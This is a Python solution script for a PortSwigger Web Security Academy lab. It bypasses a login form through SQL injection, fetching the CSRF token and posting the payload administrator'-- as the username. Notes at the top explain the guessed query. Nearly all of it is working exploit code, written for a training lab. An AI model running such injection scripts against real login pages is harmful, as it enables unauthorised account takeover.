'''
Notes: 

Link: https://portswigger.net/web-security/sql-injection/lab-login-bypass

1. Vulnerability:  Login Function (SQLi)

2. SQL Query (GUESS): SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'

3. Goal:  Login as Administrator, by exploiting SQLi

4. Exploit: SELECT * FROM users WHERE username = 'administrator'--' AND password = ''


Code reference: https://github.com/rkhal101/Web-Security-Academy-Series/blob/main/sql-injection/lab-02/sqli-lab-02.py

'''


import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(s, url):
    try:
        r = s.get(url, verify=False, proxies=proxies)
    except: 
        r = s.get(url, verify=False)

    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {"csrf": csrf,
            "username": payload,
            "password": "randomtext"}
    try:
        r = s.post(url, data=data, verify=False, proxies=proxies)
    except:
        r = s.post(url, data=data, verify=False)

    res = r.text
    if "Log out" in res:
        return True
    else:
        return False


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        
        # Optional filling Manually
        url = 'https://0ad50057047d32f68227cece00660041.web-security-academy.net/login'  #Update Domain here
        payload = "administrator'--"

    s=requests.Session()

    if exploit_sqli(s, url, payload):
        print("[+] SQL injection successful!")
    else:
        print("[-] SQL injection unsuccessful!")